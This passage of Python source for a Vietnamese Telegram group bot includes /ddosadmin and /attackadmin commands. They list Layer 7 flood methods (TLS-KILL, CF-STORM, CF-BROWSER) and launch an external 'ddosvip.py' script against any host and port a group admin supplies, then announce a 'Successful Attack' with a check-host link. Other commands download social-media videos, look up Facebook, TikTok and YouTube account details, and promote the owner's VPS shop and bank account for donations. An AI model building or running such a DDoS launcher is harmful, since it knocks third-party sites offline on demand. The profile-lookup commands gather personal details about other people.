            f'↣ VPS Giá Rẻ 💳💲: httpsvpsvanmanhgaming.click \n\n'
        )
        bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')
    else:
        bot.reply_to(message, '⚠️ Bạn đã nhập sai lệnh. Hãy sử dụng lệnh /ddos để xem phương thức tấn công!\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')








@bot.message_handler(commands=['ddosadmin'])
def ddos(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Kiểm tra quyền admin
    if user_id not in ADMIN_DDOS:
        if user_id not in ADMIN_DDOS:   
            bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!\n➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲 \nVPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click')
            return

    # Tin nhắn hướng dẫn
    help_text = '''  
>> 𝗙𝘂𝗹𝗹 𝗠𝗲𝘁𝗵𝗼𝗱𝘀 𝗟𝗮𝘆𝗲𝗿𝟳 🛡️⚡️
━━━━━━━━━━━━━━━━━━━
 • 𝗟𝗮𝘆𝗲𝗿𝟳 Admin 🛡️🔴
━━━━━━━━━━━━━━━━━━━
 • TLS-KIll [Vip💲] [https] [Đang Bảo Trì🛡️🔴]
 • CF-STORM [Vip💲] [tls] [Đang Bảo Trì🛡️🔴]
 • CF-BROWER [Vip💲] [tls] [Đang Bảo Trì🛡️🔴]
 Ví Dụ✅ : /attackadmin ADMIN-VIP https://4gvpsvanmanhgaming.click 443 \n/attackadmin + Method + Target_Url + Port
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/32wmdq.mp4
━━━━━━━━━━━━━━━━━━━
'''
    # Gửi tin nhắn với video và tin nhắn hướng dẫn
    bot.send_message(message.chat.id, help_text)








@bot.message_handler(commands=['attackadmin'])
def perform_attack(message):
    user_id = message.from_user.id
    username = message.from_user.username
    current_time = time.time()

    # Kiểm tra nếu bot đang hoạt động
    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Kiểm tra nếu lệnh được thực hiện trong nhóm hoặc siêu nhóm
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra quyền admin
    if user_id not in ADMIN_DDOS:
        bot.reply_to(message, 'Bạn không có quyền sử dụng lệnh này!\nLệnh Chỉ Dành Cho Admin Vui Lòng Sử Dụng Lệnh /ddos và /attack Để Coi Phương Thức Tấn Công!')
        return

    # Kiểm tra thời gian cooldown
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui lòng đợi {remaining_time} giây trước khi sử dụng lại lệnh /attackadmin")
        return

    args = message.text.split()

    if len(args) < 5:
        bot.reply_to(message, (
            '🛠️ Sử dụng lệnh:\n'
            '/attackadmin <method> <host> <duration> <port>\n\n'
            '📌 Ví dụ: /attackadmin HTTPS-FREE https://example.com 60 443'
        ))
        return

    method = args[1].upper()
    host = args[2]

    try:
        duration = int(args[3])
        if duration < 0 or duration > 120:
            bot.reply_to(message, '⏱ Thời gian tấn công phải từ 0 đến 120 giây.')
            return
    except ValueError:
        bot.reply_to(message, '⏱ Thời gian tấn công phải là một số nguyên.')
        return

    try:
        port = int(args[4])
        if port < 1 or port > 443:
            bot.reply_to(message, '🔌 Cổng phải nằm trong khoảng từ 443 đến 443.')
            return
    except ValueError:
        bot.reply_to(message, '🔌 Cổng phải là một số nguyên.')
        return

    # Blocked domains check
    if is_blocked_domain(host):
        bot.reply_to(message, f"🚫 Không được phép tấn công trang web có tên miền {host}")
        return

    # Xử lý phương thức tấn công
    if method == 'TLS-KILL':
        command = ["python", "ddosvip.py", host, str(duration), str(port), "tls-kill"]
    elif method == 'CF-STORM':
        command = ["python", "ddosvip.py", host, str(duration), str(port), "cf-storm"]
    elif method == 'CF-BROWSER':
        command = ["python", "ddosvip.py", host, str(duration), str(port), "cf-browser"]
    else:
        bot.reply_to(message, '⚠️ Phương thức tấn công không hợp lệ. Hãy sử dụng lệnh /ddos để xem phương thức hợp lệ!')
        return

    # Lưu thời gian cooldown
    cooldown_dict[username] = {'attack': current_time}

    # Thực hiện tấn công trong một luồng riêng
    attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
    attack_thread.start()

    # Tin nhắn thành công với URL video
    video_url = "https://files.catbox.moe/bdcwme.mp4"  # Thay thế với URL video thực tế
    check_host_url = f'https://check-host.net/check-http?host={host}&port={port}'
    message_text = (
        f'\n🚀 **Successful Attack** 🚀\n\n'
        f'↣ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝘆 👤: @{username}\n'
        f'↣ User ID 👤: [ {user_id} ]\n'
        f'↣ 𝗛𝗼𝘀𝘁 ⚔: {host}\n'
        f'↣ 𝗣𝗼𝗿𝘁 🔌: {port}\n'
        f'↣ 𝗠𝗲𝘁𝗵𝗼𝗱 📁: {method}\n'
        f'↣ 𝗧𝗶𝗺𝗲 ⏱: [ {duration}s ]\n'
        f'↣ Check_Host 🔗: [ {check_host_url} ]\n'
        f'↣ 𝗢𝘄𝗻𝗲𝗿 👑: @Vpsvanmanhgaming'
    )
    bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='HTML')





@bot.message_handler(commands=['donate'])
def donate(message):

# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
        
    reply_text = """
>> 𝗧𝗛𝗢̂𝗡𝗚 𝗧𝗜𝗡 𝗗𝗢𝗡𝗔𝗧𝗘 💵
➤ Ngân Hàng : TP BANK
➤ STK : 27701011966
➤ Chủ Tài Khoản : NGUYEN VAN TAM
➤ Nội Dung : ADMIN 1 Đẹp Zai Nhất Admin 1
➤ Số Tiền : 1000.000.000vnđ
➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲
➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click
⚠️ Lưu Ý Nếu Ít Thì 500.000.000VNĐ
Nhiều Thì 50.000.000VNĐ Nghe Chưa
Chúng Mày Hiểu Anh Nói Gì Không🌚
━━━━━━━━━━━━━━━━━━━
https://files.catbox.moe/mqi836.mp4
━━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, reply_text)



@bot.message_handler(commands=['fb'])
def fb(message):

    # Kiểm tra nếu bot đang hoạt động
    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Kiểm tra nếu lệnh được thực hiện trong nhóm hoặc siêu nhóm
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '•id fb:\n↣Ví Dụ:/fb 100089057461799\n•Link:https://www.facebook.com/profile.php?id=100089057461799\n↣Lưu Ý Là Có Thể Là Check Hơi Chậm Nha:>')
        return

    content = message.text.split()[1]

    if 'facebook.com' in content or 'fb.com' in content:
        bot.reply_to(message, '⚠️ <b>Hiện Đang Được Nâng Cấp Check Info Bằng Link</b>\n<i>Bạn Hãy Thử Bằng ID Nhé</i>', parse_mode='HTML')
        return

    phone_number = content

    file_path = os.path.join(os.getcwd(), "info.py")
    process = subprocess.Popen(["python", file_path, phone_number, "120"])
    processes.append(process)

    sent_message = bot.reply_to(
        message,
        '🔍'
    )

    # Đợi 5 giây (hoặc thời gian tương ứng bạn muốn) trước khi xóa tin nhắn
    time.sleep(5)

    # Xóa tin nhắn đã gửi
    try:
        bot.delete_message(sent_message.chat.id, sent_message.message_id)
    except Exception as e:
        print(f"Không thể xóa tin nhắn: {e}")



# Function to handle /ytb command
@bot.message_handler(commands=['ytb'])
def search_youtube(message: Message):
    user_id = message.from_user.id

    # Check if the bot is active
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Check if the chat is not a group or supergroup
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Check if the chat ID is not allowed
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    # Get the search keyword from the message
    keyword = message.text.replace("/ytb", "").strip()

    # Check if a search keyword is provided
    if not keyword:
        bot.reply_to(message, "Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
        return

    try:
        # Perform YouTube search
        search = VideosSearch(keyword, limit=6)
        results = search.result()

        # Check if there are search results
        if not results['result']:
            bot.reply_to(message, f"Vui lòng nhập từ khóa tìm kiếm!\nVí dụ: /ytb Sơn Tùng M-TP\n'{keyword}'\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
            return
        
        # Prepare list of video links and format the message
        video_links = []
        for video in results['result']:
            title = video['title']
            link = f"https://www.youtube.com/watch?v={video['id']}"
            video_links.append(f"🎬 {title}\n🔗 {link}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")

        # Send the list of video links to the user
        reply_message = "\n\n".join(video_links)
        bot.reply_to(message, reply_message)

    except Exception as e:
        bot.reply_to(message, f"Có lỗi xảy ra khi tìm kiếm video: {str(e)}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")






@bot.message_handler(commands=['capcut']) 
def handle_capcut(message): 

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    try: 
        url = message.text.split()[1]  # Lấy URL từ lệnh capcut 
        api_url = f"https://api.sumiproject.net/capcutdowload?url={url}" 
        response = requests.get(api_url) 
 
        if response.status_code == 200: 
            data = response.json() 
            title = data.get("title", "N/A") 
            description = data.get("description", "N/A") 
            usage = data.get("usage", "N/A") 
            video_url = data.get("video") 
            if video_url: 
                bot.send_message(message.chat.id, f"Mô Tả: {title}\nDescription: {description}\nLượt dùng: {usage}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
                bot.send_video(message.chat.id, video_url) 
            else: 
                bot.reply_to(message, "Không tìm thấy URL video trong dữ liệu API.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
        else: 
            bot.reply_to(message, "Không thể kết nối đến API. Vui lòng thử lại sau.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n") 
 
    except IndexError: 
        bot.reply_to(message, "Vui lòng cung cấp URL sau lệnh capcut.\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")





@bot.message_handler(commands=['tiktok'])
def luuvideo_tiktok(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    if len(message.text.split()) == 1:
        sent_message = bot.reply_to(message, 'Vui lòng nhập đúng lệnh /tiktok <links video>')
        return
    
    linktt = message.text.split()[1]
    data = f'url={linktt}'
    head = {
        "Host": "www.tikwm.com",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    }
    
    response = requests.post("https://www.tikwm.com/api/", data=data, headers=head).json()
    linkz = response['data']['play']
    rq = response['data']
    tieude = rq['title']
    view = rq['play_count']
    
    sent_message = bot.reply_to(message, f'C̶E̶0̶ V̶i̶d̶e̶o̶ D̶o̶w̶n̶l̶o̶a̶d̶ I̶n̶ P̶r̶o̶g̶r̶e̶s̶s̶...😴\n𝙳𝚎𝚜𝚌𝚛𝚒𝚋𝚎: {tieude}\n𝚅𝚒𝚎𝚠𝚜: {view}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
    
    try:
        bot.send_video(message.chat.id, video=linkz, caption=f'>>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n\n   • 𝙳𝚎𝚜𝚌𝚛𝚒𝚋𝚎: {tieude}\n   • 𝚅𝚒𝚎𝚠𝚜: {view}  ', reply_to_message_id=message.message_id, supports_streaming=True)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Video quá lớn, tôi không thể giúp bạn, vui lòng thử lại! {linkz}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
        bot.delete_message(chat_id=message.chat.id, message_id=sent_message.message_id)




@bot.message_handler(commands=['infoytb'])
def check_ifytb(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return


    if len(message.text.split()) == 1:
        bot.reply_to(message, "Sử dụng /infoytb {link người dùng youtube}➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
        return
    url = message.text.split()[1]
    rq = requests.get(f"https://scaninfo.net/?id={url}").json()
    if "error" in rq:
        bot.reply_to(message, "Link không tồn tại!")
    else:
        linkchannel = f"https://www.youtube.com/channel/{rq['id']}"
        thamgiatu = rq["date_joined"]
        username = rq["username"]
        name = rq["name"]
        videos = rq["video_count"]
        views = rq["view_count"]
        subcribes = rq["subscriber_count"]
        quocgia = rq["country"]
        mota = rq["description"]
        videodau = "https://youtube.com/video/"+rq["latest_videos"][0]["videoId"]
        tieude = rq["latest_videos"][0]["title"]
        solikevideodau = rq["latest_videos"][0]["likeCount"]
        sodislikevideodau = rq["latest_videos"][0]["dislikeCount"]
        socmtvideodau = rq["latest_videos"][0]["commentCount"]
        viewvideodau = rq["latest_videos"][0]["viewCount"]
        playlist = len(rq["playlists"])
        text = f"+ Link channel: {linkchannel}\n+ User name: {username}\n+ Name: {name}\n+ {thamgiatu}\n+ Số video: {videos}\n+ Số view: {views}\n+ Số đăng ký: {subcribes}\n+ Quốc gia: {quocgia}\n+ Mô tả: {mota}\n+ Video xuất hiện đầu: {videodau}\n- Tiêu đề: {tieude}\n- Số like: {solikevideodau}\n- Số Dislike: {sodislikevideodau}\n- Số comments: {socmtvideodau}\n- Số view: {viewvideodau}\n+ Playlist: Có {playlist}➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n"
        bot.reply_to(message, text)




# Hàm lấy thông tin tài khoản TikTok
def lay_thong_tin_tai_khoan(api_url, user_id):
    response = requests.get(api_url + user_id)
    if response.status_code == 200:
        data = response.json()
        if data['code'] == 0:
            user = data['data']['user']
            stats = data['data']['stats']
            return user, stats
        else:
            return None, "Không thể lấy thông tin tài khoản: " + data['msg']
    else:
        return None, "Lỗi kết nối tới API. Mã lỗi: " + str(response.status_code)

# Hàm in thông tin tài khoản TikTok
def in_thong_tin_tai_khoan(user, stats):
    thong_tin = "Thông tin tài khoản TikTok:\n"
    thong_tin += f"ID: {user['id']}\n"
    thong_tin += f"Tên người dùng: {user['uniqueId']}\n"
    thong_tin += f"Biệt danh: {user['nickname']}\n"
    thong_tin += f"Ảnh đại diện (nhỏ): {user['avatarThumb']}\n"
    thong_tin += f"Ảnh đại diện (vừa): {user['avatarMedium']}\n"
    thong_tin += f"Ảnh đại diện (lớn): {user['avatarLarger']}\n"
    thong_tin += f"Chữ ký: {user['signature']}\n"
    thong_tin += f"Đã xác minh: {'Có' if user['verified'] else 'Không'}\n"
    thong_tin += f"Tài khoản riêng tư: {'Có' if user['privateAccount'] else 'Không'}\n\n"
    thong_tin += "Thống kê:\n"
    thong_tin += f"Số người theo dõi: {stats['followingCount']}\n"
    thong_tin += f"Số người hâm mộ: {stats['followerCount']}\n"
    thong_tin += f"Tổng số lượt thích: {stats['heartCount']}\n"
    thong_tin += f"Số video: {stats['videoCount']}\n"
    thong_tin += f"Lượt thả tim: {stats['heart']}\n"
    return thong_tin

@bot.message_handler(commands=['tiktokid'])
def handle_tiktok(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    if len(message.text.split()) == 1:
        sent_message = bot.reply_to(message, 'Vui lòng nhập đúng lệnh /tiktokid <id Tài Khoản Tiktok>\nVí Dụ:/tiktokid @kecodon7103>>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n')
        return
    
    user_id = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
    if not user_id:
        bot.reply_to(message, "Vui lòng cung cấp ID người dùng TikTok.\nSử dụng: /tiktokid <id Tài Khoản Tiktok\nVí Dụ:/tiktokid:@kecodon7103>\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\n VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\nShop 4G💳💲: https://4gvpsvanmanhgaming.click\n")
        return

    api_url = "https://api.sumiproject.net/tiktok?info="
    user, stats_or_error = lay_thong_tin_tai_khoan(api_url, user_id)
    if user:
        thong_tin = in_thong_tin_tai_khoan(user, stats_or_error)
        bot.reply_to(message, thong_tin)
    else:
        bot.reply_to(message, stats_or_error)










@bot.message_handler(commands=['anhgai'])
def anhh_gai(message):
    user_id = message.from_user.id
    username = message.from_user.username

    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Trộm bot à?** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    try:
        response = requests.get('https://api.sumiproject.net/images/girl')
        
        if response.status_code == 200:
            data = response.json()
            if 'url' in data:
                image_url = data['url']
                if username:
                    user_mention = f"@{username}"
                else:
                    user_mention = f"<a href='tg://user?id={user_id}'></a>"

                bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n• VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n• Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
        else:
            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n Shop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
    except requests.exceptions.RequestException as req_err:
        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\n Shop 4G 💳💲: https://4gvpsvanmanhgaming.click")
    except Exception as e:
        bot.reply_to(message, f"❌ Đã xảy ra lỗi: {e}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.clic\n Shop 4G 💳💲: https://4gvpsvanmanhgaming.click")







@bot.message_handler(commands=['anhgaisexy'])
def anhh_gai(message):
    user_id = message.from_user.id
    username = message.from_user.username

    if not is_bot_active:
        bot.reply_to(message, '🚫 Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    # Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '🚫 **Xin Lỗi!** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    # Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, '🚫 **Trộm bot à?** 🚫\n>> Tôi Chỉ Hoạt Động Trong Nhóm. Hãy tham gia nhóm tại: https://t.me/botvipvc')
        return

    try:
        response = requests.get('https://api.sumiproject.net/video/girlsexy')
        
        if response.status_code == 200:
            data = response.json()
            if 'url' in data:
                image_url = data['url']
                if username:
                    user_mention = f"@{username}"
                else:
                    user_mention = f"<a href='tg://user?id={user_id}'></a>"

                bot.send_message(message.chat.id, f"@{username} đã yêu cầu ảnh:", parse_mode='HTML')
                bot.send_photo(message.chat.id, image_url, caption=f">>𝙳𝚘𝚠𝚗𝚕𝚘𝚊𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚟, 𝚝𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚘 𝚝𝚑𝚎 𝚋𝚘𝚝 ✅\n• 𝙾𝚠𝚗𝚎𝚛: @Vpsvanmanhgaming\n•VPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\n•Shop 4G 💳💲: https://4gvpsvanmanhgaming.click\n• Ảnh dành cho @{username}", parse_mode='HTML')
            else:
                bot.reply_to(message, "❌ Không tìm thấy URL ảnh trong phản hồi từ API.")
        else:
            bot.reply_to(message, f"❌ Có lỗi xảy ra khi gửi yêu cầu đến API. Status code: {response.status_code}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: 'https://4gvpsvanmanhgaming.click")
    except requests.exceptions.RequestException as req_err:
        bot.reply_to(message, f"❌ Lỗi khi gửi yêu cầu: {req_err}\n ➤ 𝗢𝘄𝗻𝗲𝗿 👑 : @Vpsvanmanhgaming💳💲\nVPS Giá Rẻ 💳💲: 'https://httpsvpsvanmanhgaming.click\nShop 4G 💳💲: https://4gvpsvanmanhgaming.click")
    except Exception as e:
